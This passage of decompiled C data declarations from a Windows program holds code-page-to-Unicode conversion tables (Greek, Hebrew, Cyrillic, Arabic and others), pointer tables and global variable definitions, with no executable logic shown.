  179,
  900,
  901,
  902,
  183,
  904,
  905,
  906,
  187,
  908,
  189,
  910,
  911,
  912,
  913,
  914,
  915,
  916,
  917,
  918,
  919,
  920,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  -3,
  931,
  932,
  933,
  934,
  935,
  936,
  937,
  938,
  939,
  940,
  941,
  942,
  943,
  944,
  945,
  946,
  947,
  948,
  949,
  950,
  951,
  952,
  953,
  954,
  955,
  956,
  957,
  958,
  959,
  960,
  961,
  962,
  963,
  964,
  965,
  966,
  967,
  968,
  969,
  970,
  971,
  972,
  973,
  974,
  -3
}; // weak
_WORD word_41CA00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  -3,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  215,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  247,
  187,
  188,
  189,
  190,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  8215,
  1488,
  1489,
  1490,
  1491,
  1492,
  1493,
  1494,
  1495,
  1496,
  1497,
  1498,
  1499,
  1500,
  1501,
  1502,
  1503,
  1504,
  1505,
  1506,
  1507,
  1508,
  1509,
  1510,
  1511,
  1512,
  1513,
  1514,
  -3,
  -3,
  8206,
  8207,
  -3
}; // weak
_WORD word_41CB00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  728,
  321,
  164,
  317,
  346,
  167,
  168,
  352,
  350,
  356,
  377,
  173,
  381,
  379,
  176,
  261,
  731,
  322,
  180,
  318,
  347,
  711,
  184,
  353,
  351,
  357,
  378,
  733,
  382,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  286,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  304,
  350,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  287,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  305,
  351,
  255
}; // weak
_WORD word_41CC00[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  274,
  290,
  298,
  296,
  310,
  167,
  315,
  272,
  352,
  358,
  381,
  173,
  362,
  330,
  176,
  261,
  275,
  291,
  299,
  297,
  311,
  183,
  316,
  273,
  353,
  359,
  382,
  8213,
  363,
  331,
  256,
  193,
  194,
  195,
  196,
  197,
  198,
  302,
  268,
  201,
  280,
  203,
  278,
  205,
  206,
  207,
  208,
  325,
  332,
  211,
  212,
  213,
  214,
  360,
  216,
  370,
  218,
  219,
  220,
  221,
  222,
  223,
  257,
  225,
  226,
  227,
  228,
  229,
  230,
  303,
  269,
  233,
  281,
  235,
  279,
  237,
  238,
  239,
  240,
  326,
  333,
  243,
  244,
  245,
  246,
  361,
  248,
  371,
  250,
  251,
  252,
  253,
  254,
  312
}; // weak
_WORD word_41CD00[128] =
{
  8364,
  -3,
  8218,
  -3,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  352,
  8249,
  346,
  356,
  381,
  377,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  353,
  8250,
  347,
  357,
  382,
  378,
  160,
  711,
  728,
  321,
  164,
  260,
  166,
  167,
  168,
  169,
  350,
  171,
  172,
  173,
  174,
  379,
  176,
  177,
  731,
  322,
  180,
  181,
  182,
  183,
  184,
  261,
  351,
  187,
  317,
  733,
  318,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  272,
  323,
  327,
  211,
  212,
  336,
  214,
  215,
  344,
  366,
  218,
  368,
  220,
  221,
  354,
  223,
  341,
  225,
  226,
  259,
  228,
  314,
  263,
  231,
  269,
  233,
  281,
  235,
  283,
  237,
  238,
  271,
  273,
  324,
  328,
  243,
  244,
  337,
  246,
  247,
  345,
  367,
  250,
  369,
  252,
  253,
  355,
  729
}; // weak
_WORD word_41CE00[128] =
{
  1026,
  1027,
  8218,
  1107,
  8222,
  8230,
  8224,
  8225,
  8364,
  8240,
  1033,
  8249,
  1034,
  1036,
  1035,
  1039,
  1106,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  1113,
  8250,
  1114,
  1116,
  1115,
  1119,
  160,
  1038,
  1118,
  1032,
  164,
  1168,
  166,
  167,
  1025,
  169,
  1028,
  171,
  172,
  173,
  174,
  1031,
  176,
  177,
  1030,
  1110,
  1169,
  181,
  182,
  183,
  1105,
  8470,
  1108,
  187,
  1112,
  1029,
  1109,
  1111,
  1040,
  1041,
  1042,
  1043,
  1044,
  1045,
  1046,
  1047,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1056,
  1057,
  1058,
  1059,
  1060,
  1061,
  1062,
  1063,
  1064,
  1065,
  1066,
  1067,
  1068,
  1069,
  1070,
  1071,
  1072,
  1073,
  1074,
  1075,
  1076,
  1077,
  1078,
  1079,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1088,
  1089,
  1090,
  1091,
  1092,
  1093,
  1094,
  1095,
  1096,
  1097,
  1098,
  1099,
  1100,
  1101,
  1102,
  1103
}; // weak
_WORD word_41CF00[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  -3,
  381,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250,
  339,
  -3,
  382,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  208,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  221,
  222,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  240,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  253,
  254,
  255
}; // weak
_WORD word_41D000[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  -3,
  8249,
  -3,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  -3,
  8250,
  -3,
  -3,
  -3,
  -3,
  160,
  901,
  902,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  -3,
  171,
  172,
  173,
  174,
  8213,
  176,
  177,
  178,
  179,
  900,
  181,
  182,
  183,
  904,
  905,
  906,
  187,
  908,
  189,
  910,
  911,
  912,
  913,
  914,
  915,
  916,
  917,
  918,
  919,
  920,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  -3,
  931,
  932,
  933,
  934,
  935,
  936,
  937,
  938,
  939,
  940,
  941,
  942,
  943,
  944,
  945,
  946,
  947,
  948,
  949,
  950,
  951,
  952,
  953,
  954,
  955,
  956,
  957,
  958,
  959,
  960,
  961,
  962,
  963,
  964,
  965,
  966,
  967,
  968,
  969,
  970,
  971,
  972,
  973,
  974,
  -3
}; // weak
_WORD word_41D100[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250,
  339,
  -3,
  -3,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  286,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  304,
  350,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  287,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  305,
  351,
  255
}; // weak
_WORD word_41D200[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  -3,
  8249,
  -3,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  -3,
  8250,
  -3,
  -3,
  -3,
  -3,
  160,
  161,
  162,
  163,
  8362,
  165,
  166,
  167,
  168,
  169,
  215,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  247,
  187,
  188,
  189,
  190,
  191,
  1456,
  1457,
  1458,
  1459,
  1460,
  1461,
  1462,
  1463,
  1464,
  1465,
  -3,
  1467,
  1468,
  1469,
  1470,
  1471,
  1472,
  1473,
  1474,
  1475,
  1520,
  1521,
  1522,
  1523,
  1524,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1488,
  1489,
  1490,
  1491,
  1492,
  1493,
  1494,
  1495,
  1496,
  1497,
  1498,
  1499,
  1500,
  1501,
  1502,
  1503,
  1504,
  1505,
  1506,
  1507,
  1508,
  1509,
  1510,
  1511,
  1512,
  1513,
  1514,
  -3,
  -3,
  8206,
  8207,
  -3
}; // weak
_WORD word_41D300[128] =
{
  8364,
  1662,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  1657,
  8249,
  338,
  1670,
  1688,
  1672,
  1711,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  1705,
  8482,
  1681,
  8250,
  339,
  8204,
  8205,
  1722,
  160,
  1548,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  1726,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  1563,
  187,
  188,
  189,
  190,
  1567,
  1729,
  1569,
  1570,
  1571,
  1572,
  1573,
  1574,
  1575,
  1576,
  1577,
  1578,
  1579,
  1580,
  1581,
  1582,
  1583,
  1584,
  1585,
  1586,
  1587,
  1588,
  1589,
  1590,
  215,
  1591,
  1592,
  1593,
  1594,
  1600,
  1601,
  1602,
  1603,
  224,
  1604,
  226,
  1605,
  1606,
  1607,
  1608,
  231,
  232,
  233,
  234,
  235,
  1609,
  1610,
  238,
  239,
  1611,
  1612,
  1613,
  1614,
  244,
  1615,
  1616,
  247,
  1617,
  249,
  1618,
  251,
  252,
  8206,
  8207,
  1746
}; // weak
_WORD word_41D400[128] =
{
  8364,
  -3,
  8218,
  -3,
  8222,
  8230,
  8224,
  8225,
  -3,
  8240,
  -3,
  8249,
  -3,
  168,
  711,
  184,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  -3,
  8482,
  -3,
  8250,
  -3,
  175,
  731,
  -3,
  160,
  -3,
  162,
  163,
  164,
  -3,
  166,
  167,
  216,
  169,
  342,
  171,
  172,
  173,
  174,
  198,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  248,
  185,
  343,
  187,
  188,
  189,
  190,
  230,
  260,
  302,
  256,
  262,
  196,
  197,
  280,
  274,
  268,
  201,
  377,
  278,
  290,
  310,
  298,
  315,
  352,
  323,
  325,
  211,
  332,
  213,
  214,
  215,
  370,
  321,
  346,
  362,
  220,
  379,
  381,
  223,
  261,
  303,
  257,
  263,
  228,
  229,
  281,
  275,
  269,
  233,
  378,
  279,
  291,
  311,
  299,
  316,
  353,
  324,
  326,
  243,
  333,
  245,
  246,
  247,
  371,
  322,
  347,
  363,
  252,
  380,
  382,
  729
}; // weak
_WORD word_41D500[128] =
{
  8364,
  -3,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  -3,
  8249,
  338,
  -3,
  -3,
  -3,
  -3,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  -3,
  8250,
  339,
  -3,
  -3,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  258,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  768,
  205,
  206,
  207,
  272,
  209,
  777,
  211,
  212,
  416,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  431,
  771,
  223,
  224,
  225,
  226,
  259,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  769,
  237,
  238,
  239,
  273,
  241,
  803,
  243,
  244,
  417,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  432,
  8363,
  255
}; // weak
_WORD word_41D600[128] =
{
  9472,
  9474,
  9484,
  9488,
  9492,
  9496,
  9500,
  9508,
  9516,
  9524,
  9532,
  9600,
  9604,
  9608,
  9612,
  9616,
  9617,
  9618,
  9619,
  8992,
  9632,
  8729,
  8730,
  8776,
  8804,
  8805,
  160,
  8993,
  176,
  178,
  183,
  247,
  9552,
  9553,
  9554,
  1105,
  9555,
  9556,
  9557,
  9558,
  9559,
  9560,
  9561,
  9562,
  9563,
  9564,
  9565,
  9566,
  9567,
  9568,
  9569,
  1025,
  9570,
  9571,
  9572,
  9573,
  9574,
  9575,
  9576,
  9577,
  9578,
  9579,
  9580,
  169,
  1102,
  1072,
  1073,
  1094,
  1076,
  1077,
  1092,
  1075,
  1093,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1103,
  1088,
  1089,
  1090,
  1091,
  1078,
  1074,
  1100,
  1099,
  1079,
  1096,
  1101,
  1097,
  1095,
  1098,
  1070,
  1040,
  1041,
  1062,
  1044,
  1045,
  1060,
  1043,
  1061,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1071,
  1056,
  1057,
  1058,
  1059,
  1046,
  1042,
  1068,
  1067,
  1047,
  1064,
  1069,
  1065,
  1063,
  1066
}; // weak
_UNKNOWN unk_41D700; // weak
int (*off_41D720)[21] = &dword_411034; // weak
int (*off_41D73C)[34] = &dword_411088; // weak
int (*off_41D76C)[21] = &dword_4116E4; // weak
int dword_41D830 = 0; // weak
char byte_41D836 = '\x01'; // weak
char aMsSansSerif[15] = "\rMS Sans Serif"; // weak
int dword_41D858 = 0; // weak
int dword_41D9A8 = 0; // weak
__int16 word_41DA38[8] = { 0, 1, 2, 3, 4, 5, 6, -16245 }; // weak
__int16 word_41DA48[16] = { 1, 16, 11, 6, 13, 4, 14, 5, 12, 3, 15, 2, 9, 8, 7, 10 }; // weak
int dword_41DA68 = 0; // weak
int dword_41DA6C = 0; // weak
int dword_41DA70 = 0; // weak
char byte_41DA74[64] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '\0',
  '',
  '',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '',
  '\0',
  '',
  '\0',
  '\0',
  '',
  '',
  '\0',
  '',
  '',
  '',
  '\0',
  '',
  '',
  '',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\0',
  '\xFF',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0'
}; // weak
int **off_41DAD0 = &off_40B44C; // weak
int *off_41DAD4 = &dword_41E018; // weak
int **off_41DAD8[2] = { &off_406014, &off_40617C }; // weak
int *off_41DAE0 = &dword_41E004; // weak
int **off_41DAE8[7] =
{
  &off_40604C,
  &off_40607C,
  &off_40B43C,
  &off_405F3C,
  &off_40615C,
  &off_40613C,
  &off_406164
}; // weak
int **off_41DAF0[5] = { &off_40B43C, &off_405F3C, &off_40615C, &off_40613C, &off_406164 }; // weak
void *off_41DB04 = &unk_41E010; // weak
int *off_41DB08[10] =
{
  &off_405F0C,
  &off_405FBC,
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB0C[9] =
{
  &off_405FBC,
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB10[8] =
{
  &off_405F04,
  &off_40609C,
  &off_405F44,
  &off_405FC4,
  &off_40603C,
  &off_40B414,
  &off_40B434,
  &off_4060EC
}; // weak
int *off_41DB20[4] = { &off_40603C, &off_40B414, &off_40B434, &off_4060EC }; // weak
int *off_41DB24[3] = { &off_40B414, &off_40B434, &off_4060EC }; // weak
int *off_41DB28[2] = { &off_40B434, &off_4060EC }; // weak
int (*off_41DB30)[115] = &dword_41E214; // weak
int (*off_41DB38)[6] = &dword_41E570; // weak
int **off_41DB40[2] = { &off_406054, &off_40B424 }; // weak
int **off_41DB44 = &off_40B424; // weak
void *off_41DB48 = &unk_41E008; // weak
int **off_41DB4C[2] = { &off_40B42C, &off_4060CC }; // weak
int off_41DB54[2] = { 4317184, 4317196 }; // weak
int off_41DB58 = 4317196; // weak
int (*off_41DB5C)[11] = &dword_41E510; // weak
int **off_41DB60[36] =
{
  &off_40B444,
  &off_406114,
  &off_405F9C,
  &off_405FA4,
  &off_40B454,
  &off_40614C,
  &off_405F14,
  &off_405F5C,
  &off_405FCC,
  &off_40B46C,
  &off_405FFC,
  &off_4060BC,
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB70[32] =
{
  &off_40B454,
  &off_40614C,
  &off_405F14,
  &off_405F5C,
  &off_405FCC,
  &off_40B46C,
  &off_405FFC,
  &off_4060BC,
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB84[27] =
{
  &off_40B46C,
  &off_405FFC,
  &off_4060BC,
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB90[24] =
{
  &off_40B40C,
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB94[23] =
{
  &off_40B404,
  &off_406024,
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DB9C[21] =
{
  &off_40B3C4,
  &off_4060E4,
  &off_405FDC,
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBA8[18] =
{
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBB4[15] =
{
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBB8[14] =
{
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBCC[9] =
{
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBDC[5] = { &off_405F84, &off_406144, &off_405F7C, &off_40B41C, &off_40611C }; // weak
int **off_41DBE8[2] = { &off_40B41C, &off_40611C }; // weak
void *off_41DBF0 = &unk_41E014; // weak
int **off_41DBF8 = &off_405FF4; // weak
void *off_41DBFC = &unk_41D700; // weak
int **off_41DC04[5] = { &off_405EFC, &off_405F2C, &off_40601C, &off_4060FC, &off_406124 }; // weak
int **off_41DC0C[3] = { &off_40601C, &off_4060FC, &off_406124 }; // weak
char *off_41DC18 = &byte_41E040; // weak
int **off_41DC24[3] = { &off_40B3F4, &off_406044, &off_40B3CC }; // weak
int **off_41DC28[2] = { &off_406044, &off_40B3CC }; // weak
int **off_41DC2C = &off_40B3CC; // weak
char *off_41DC30 = &byte_41E042; // weak
int **off_41DC38[19] =
{
  &off_40B3D4,
  &off_40608C,
  &off_406034,
  &off_4060AC,
  &off_406184,
  &off_40606C,
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC40[17] =
{
  &off_406034,
  &off_4060AC,
  &off_406184,
  &off_40606C,
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC50[13] =
{
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC54[12] =
{
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC78[3] = { &off_405FB4, &off_405F8C, &off_405F6C }; // weak
void *off_41DC84 = &unk_41E5A8; // weak
int **off_41DC88[3] = { &off_405FEC, &off_406084, &off_40B464 }; // weak
int **off_41DC90 = &off_40B464; // weak
int (*dword_41E000)(void); // weak
int dword_41E004; // weak
int (*dword_41E00C)(void); // weak
int (*dword_41E018)(void); // weak
int dword_41E01C; // weak
int dword_41E020; // weak
char byte_41E024; // weak
int dword_41E028; // weak
int dword_41E02C; // weak
int dword_41E030; // weak
_UNKNOWN unk_41E034; // weak
int dword_41E038; // weak
int dword_41E03C; // weak
char byte_41E040; // weak
char byte_41E041; // weak
char byte_41E042; // weak
char byte_41E043; // weak
char byte_41E044; // weak
_DWORD dword_41E048[115]; // weak
_DWORD dword_41E214[115]; // weak
int (*dword_41E3E0)(void); // weak
int (__stdcall *dword_41E3E4)(_DWORD); // weak
int (*dword_41E3E8)(void); // weak
VARIANTARG stru_41E3EC; // weak
VARIANTARG stru_41E3FC; // weak
__int16 word_41E40C; // weak
int dword_41E414; // weak
int dword_41E41C; // weak
int dword_41E420; // weak
int dword_41E424; // weak
char byte_41E428; // weak
int dword_41E42C; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
HLOCAL dword_41E448; // idb
int dword_41E44C; // weak
int dword_41E450; // weak
_DWORD dword_41E460[4]; // weak
_UNKNOWN unk_41E470; // weak
int dword_41E474; // weak
int dword_41E47C; // weak
int dword_41E480; // weak
int dword_41E484; // weak
HLOCAL hMem; // idb
int dword_41E48C[4]; // weak
const void *dword_41E49C; // weak
int dword_41E4A0; // weak
int dword_41E4A4; // weak
int dword_41E4A8; // weak
int dword_41E4AC; // weak
char byte_41E4C8; // weak
char byte_41E4C9; // weak
DWORD TlsIndex; // idb
HMODULE hInst; // idb
int dword_41E4D8; // weak
int dword_41E4DC; // weak
int dword_41E4E0; // weak
int dword_41E4E4; // weak
int dword_41E4E8; // weak
char byte_41E4EC; // weak
char byte_41E4ED; // weak
char byte_41E4EE; // weak
char byte_41E4EF; // weak
char byte_41E4F0; // weak
char byte_41E4F1; // weak
int dword_41E4F4; // weak
int dword_41E4F8; // weak
char byte_41E4FC; // weak
int dword_41E500; // weak
int dword_41E504; // weak
int dword_41E508; // weak
int dword_41E50C[]; // weak
int dword_41E510[11]; // weak
int dword_41E53C[]; // weak
int dword_41E540[11]; // weak
int dword_41E56C[]; // weak
int dword_41E570[6]; // weak
int dword_41E588[]; // weak
int dword_41E58C[7]; // weak
_UNKNOWN unk_41E5A8; // weak
__int16 word_41E5AC; // weak
__int16 word_41E5AE; // weak
int dword_41E5B0[]; // weak
int dword_41E5B4[6]; // weak
int dword_41E5CC[]; // weak
_UNKNOWN unk_41E5D0; // weak
char byte_41E5EC; // weak
int dword_41E5F0; // weak
int dword_41E5F4; // weak
int dword_41E5F8; // weak
_DWORD *dword_41E5FC; // weak
int dword_41E600; // weak
int dword_41E604; // weak
int dword_41E608; // weak
int dword_41E60C; // weak
int dword_41E610; // weak
int dword_41E614; // weak
int dword_41E618; // weak
int dword_41E61C; // weak
int dword_41E620; // weak
int dword_41E624; // weak
struct _RTL_CRITICAL_SECTION stru_41E628; // idb
HWND hWnd; // idb
int dword_41E644; // weak
int dword_41E648; // weak
int dword_41E64C; // weak
int dword_41E650; // weak
int dword_41E654; // weak
int dword_41E658; // weak
int dword_41E65C; // weak
int dword_41E660; // weak
int dword_41E664; // weak
int dword_41E668; // weak
int dword_41E66C; // weak
int dword_41E670; // weak
HGDIOBJ ho; // idb
int dword_41E678; // weak
int nNumerator; // idb
HGDIOBJ h; // idb
HGDIOBJ dword_41E684; // idb
HGDIOBJ dword_41E688; // idb
int dword_41E68C; // weak
struct _RTL_CRITICAL_SECTION stru_41E690; // idb
struct _RTL_CRITICAL_SECTION stru_41E6A8; // idb
int dword_41E6C0; // weak
int dword_41E6C4; // weak
int dword_41E6C8; // weak
int dword_41E6CC; // weak
int dword_41E6D0; // weak
int dword_41E6D4; // weak
_UNKNOWN unk_41E6D8; // weak
